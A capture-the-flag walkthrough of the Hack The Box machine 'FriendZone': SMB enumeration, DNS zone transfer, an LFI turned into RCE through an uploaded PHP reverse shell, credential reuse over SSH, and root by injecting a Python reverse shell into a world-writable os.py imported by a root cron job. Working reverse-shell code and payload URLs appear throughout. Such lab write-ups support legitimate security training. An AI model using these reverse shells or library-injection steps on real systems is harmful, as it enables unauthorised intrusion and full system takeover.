# FriendZone
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan & SMB Enumeration | Identified several open ports, including SMB (139/445). Enumerated SMB shares and found a readable `general` share and a writable `Development` share. |
| 2 | (Local) | SMB File Access & DNS Zone Transfer | Downloaded `creds.txt` from the `general` SMB share, which contained credentials for a portal. Performed a DNS zone transfer on the `friendzone.red` and `friendzoneportal.red` domains, revealing several subdomains. |
| 3 | www-data | Web Portal Vulnerability (LFI to RCE) | Discovered a login portal at `administrator1.friendzone.red`. Logged in using the credentials from `creds.txt`. Found a **Local File Inclusion (LFI)** vulnerability in `dashboard.php`. Used the writable `Development` SMB share to upload a PHP reverse shell, then included it via the LFI to gain a shell as `www-data`. |
| 4 | friend | Credential Reuse (User Flag) | Discovered MySQL credentials in `/var/www/mysql_data.conf`. These credentials (`friend:Agpyu12!0.213$`) were reusable for SSH, allowing a login as the `friend` user. |
| 5 | root | World-Writable Python Library & Cron Job | Identified a cron job running as `root` that executed a Python script (`reporter.py`). The script imported the `os` library, which was found to be world-writable. A malicious Python reverse shell payload was injected into `/usr/lib/python2.7/os.py`. When the cron job executed, the payload was run as root, granting a root shell. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
Host is up (0.036s latency).
Not shown: 993 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-title: 404 Not Found
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| smb2-time:
|   date: 2022-01-17T10:25:35
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2022-01-17T12:25:35+02:00
```
As we can see there are a lot of services running on this box.  
As first thing, we can try to enumerate the samba share and see if there is any shares available and if the share contains any sensitive information.  
Let's start enumerating SMB service with smbmap, so that we can crawl and identify file shares.  
```
[root@kali FriendZone ]$ smbmap -H $TARGET
[+] Guest session       IP: 10.10.10.123:445    Name: friendzoneportal.red                              
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```
As we can notice there are two shares that we can access: one is general, with read only permissions and the other is Development.  
As we can see Files share in mounted on /etc/Files, so we can guess that the same path is being used for other shares also.  
with smbmap we can also enumerate shares recursively, specifying the depth of the recursion
```
[root@kali FriendZone ]$ smbmap -H $TARGET -R --depth 5
[+] Guest session       IP: 10.10.10.123:445    Name: friendzoneportal.red                              
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        .\general\*
        dr--r--r--                0 Wed Jan 16 21:10:51 2019    .
        dr--r--r--                0 Wed Jan 23 22:51:02 2019    ..
        fr--r--r--               57 Wed Oct 10 01:52:42 2018    creds.txt
        Development                                             READ, WRITE     FriendZone Samba Server Files
        .\Development\*
        dr--r--r--                0 Tue Jan 18 09:10:32 2022    .
        dr--r--r--                0 Wed Jan 23 22:51:02 2019    ..
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```
As we can see we get a list of file in that share.  
Now we can connect to smb share and retrievie the .txt file using smbclient:  
```
[root@kali FriendZone ]$ smbclient //$TARGET/general
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 21:10:51 2019
  ..                                  D        0  Wed Jan 23 22:51:02 2019
  creds.txt                           N       57  Wed Oct 10 01:52:42 2018

                9221460 blocks of size 1024. 6226380 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```
The creds file contains admin credentials.
```
[root@kali FriendZone ]$ cat creds.txt            
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```
We can guess this credentials are related to some sort of web service, so let's start enumerating port 80/443.
As we open port 80 we can see a picture with a statement ```Email us at: info@friendzoneportal.red``` changing the host header/enumerate directories does not show anything, so we can suppose that all the services are running over https (443).  
Before jump into the enumeration of port 443, since port 53 is opened we want to try to perform a DNS zone transfer for two zones: friendzoneportal.red (shown on http page) and friendzone.red (shown in the certificate issue).  
```
[root@kali FriendZone ]$ dig axfr friendzone.red @$TARGET         

; <<>> DiG 9.17.21-1-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 40 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Tue Jan 18 14:54:23 CET 2022
;; XFR size: 8 records (messages 1, bytes 289)

[root@kali FriendZone ]$ dig axfr friendzoneportal.red @$TARGET        

; <<>> DiG 9.17.21-1-Debian <<>> axfr friendzoneportal.red @10.10.10.123
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 36 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Tue Jan 18 14:54:30 CET 2022
;; XFR size: 9 records (messages 1, bytes 309)
```  
Now that we have all the domain names we can build up a list and use aquatone to get an overview of what all this sites contains.  
```
[root@kali aquatone ]$ cat tmp | aquatone
aquatone v1.7.0 started at 2022-01-18T14:58:23+01:00

Using unreliable Google Chrome for screenshots. Install Chromium for better results.

Targets    : 9
Threads    : 2
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

https://vpn.friendzoneportal.red: 404 Not Found
https://friendzone.red: 200 OK
https://friendzoneportal.red: 200 OK
https://admin.friendzoneportal.red: 200 OK
https://imports.friendzoneportal.red: 404 Not Found
https://files.friendzoneportal.red: 404 Not Found
https://hr.friendzone.red: 404 Not Found
https://administrator1.friendzone.red: 200 OK
https://uploads.friendzone.red: 200 OK
https://vpn.friendzoneportal.red: screenshot successful
https://friendzone.red: screenshot successful
https://admin.friendzoneportal.red: screenshot successful
https://friendzoneportal.red: screenshot successful
https://imports.friendzoneportal.red: screenshot successful
https://hr.friendzone.red: screenshot successful
https://files.friendzoneportal.red: screenshot successful
https://administrator1.friendzone.red: screenshot successful
https://uploads.friendzone.red: screenshot successful
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2022-01-18T14:58:23+01:00
 - Finished at : 2022-01-18T14:58:29+01:00
 - Duration    : 7s

Requests:
 - Successful : 9
 - Failed     : 0

 - 2xx : 5
 - 3xx : 0
 - 4xx : 4
 - 5xx : 0

Screenshots:
 - Successful : 9
 - Failed     : 0

Wrote HTML report to: aquatone_report.html
```
As we can infer, this tool takes screenshots of all the subdomains contained in tmp file and generates reports in various formats.  
We can now open the html repor and inspect it.  
After we open it, we can see that only two portals are prompting for a login: https://admin.friendzoneportal.red/ and https://administrator1.friendzone.red/.
https://admin.friendzoneportal.red/ seems to be a fake login page and every credentials we input the site responds with something like 'page under construction'.  
the second allow us lo log in using credentials found on the smb service.  
here we can navigate to '/dashboard' and here we can see the following:  

## Foothold
After we log in into the portal, we can see the following statement
```
image_name param is missed !
please enter it to show the image
default is image_id=a.jpg&pagename=timestamp
```
so, if we try to set the parameter we are shown a picture, a.jpg and the following: ```Final Access timestamp is 1642521979```.
So, we can assume that the page is somehow including a page that profide timestamp.  
If we try to include, for example, login, we get ```Wrong!``` that is the same response that gets returned when an incorrect credential is given to login page.  
As a further evidence, we can also try to include ```dashboard``` this will include the page recursively and lock the webserver.  
So, it seems like we have a LFI vulnerability.  
If we try to include any system file the include fails.  
Now, let's try to download the code using the following php wrapper:  
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=login
```
PHP comes with many [built-in wrappers](https://www.php.net/manual/en/wrappers.php) for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize().  
In this case we are using php:// wrapper that allows us to access various I/O streams.  
We can use convert.* filters to processing all stream data through the base64_encode() and base64_decode() functions respectively.  
So as a result we can inject this conversion wrappers in the include() function and get the base64 encoded php source code.  
As we cans see in the dashboard.php source code we have an include for a file from the GET parameter, and the .php extension is added directly within the code
```
include($_GET["pagename"].".php");
```
Now we need to transform the discovered LFI into RCE.  
To do so, if we remember, way back we discovered a /Developer samba share that we can write into.  
since the File share is mounted on ```/etc/Files``` we can guess that the Developer share is mounted in ```/etc/Development```.
Let's upload a reverse shell there and try to include it using the LFI:
```
[root@kali FriendZone ]$ smbclient //$TARGET/Development
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (47.5 kb/s) (average 47.5 kb/s)
smb: \> ls
  .                                   D        0  Tue Jan 18 16:47:21 2022
  ..                                  D        0  Wed Jan 23 22:51:02 2019
  php-reverse-shell.php               A     5493  Tue Jan 18 16:47:21 2022

                9221460 blocks of size 1024. 6443916 blocks available
smb: \>
```
now lets request the following:
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```
And we get a shell.
```
root@kali:~/Documents/HTB/Boxes/FriendZone# nc -lvnp 9001
listening on [any] 9001 ...
        connect to [10.10.14.10] from (UNKNOWN) [10.10.10.123] 41828
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 17:50:10 up  2:17,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
friend   pts/0    10.10.14.10      15:34    2:14m  0.08s  0.08s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

## User
Poking around on the site, we can find the following file under ```/var/www/mysql_data.conf```
```
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```
if we try these credentials with SSH, we can login as user friend:
```
[root@kali FriendZone ]$ ssh -l friend $TARGET          
friend@10.10.10.123's password:
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Tue Jan 18 15:34:06 2022 from 10.10.14.10
friend@FriendZone:~$
```

## Root
First thing, as always we run linpeas.sh to enumerate the system for a privilege escalation.  
Since we do not found anything using linpeas.sh let's use pspy to snoop process and see if there is any cron running as root that is somehow exploitable.  
After a while we can see that this cron gets executed
```
2022/01/18 12:58:01 CMD: UID=0    PID=38713  | /usr/sbin/CRON -f
2022/01/18 13:00:01 CMD: UID=0    PID=38720  | /usr/bin/python /opt/server_admin/reporter.py
```
If we inspect the file, we can see that the script is owned by root and is not writable by the user friend.  
```
friend@FriendZone:/opt/server_admin$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 24  2019 .
drwxr-xr-x 3 root root 4096 Oct  6  2018 ..
-rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py
```
If we read the script, we can see the following content, actually nothing gets executed, so at a first glance seems that we cannot hijack the execution of this script.  
```
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
Actually, the only relevant thing that we can see is the ```import os``` statement.  
So, we can try to edit the library with malicious code, so that wen it gets executed it execute a reverse shell (as root).
Let's locate the library and check the permissions.  
```
friend@FriendZone:/opt/server_admin$ locate os.py
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
/usr/lib/python3.6/os.py
/usr/lib/python3.6/encodings/palmos.py
friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python2.7/os.py
-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
```
As we can see os.py is world writable, so let's inject our reverse shell.
From [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) let's use the following shell:  
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
let's edit it as follows, so that we can inject it directly in the library.
```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.10",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
As we are running the reverse shell directly within the os library, we'll need to remove ```os.``` as the functions are available directly into the code where this snippet resides.  
Obviously we should remove also os from the list of the import.  
```
import socket,subprocess;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.10",4444));
dup2(s.fileno(),0);
dup2(s.fileno(),1);
dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
Now all we need to do, it to wait for cron to execute, and we gain a shell as root.
```
root@kali:~/Documents/HTB/Boxes/FriendZone# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.123] 44684
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
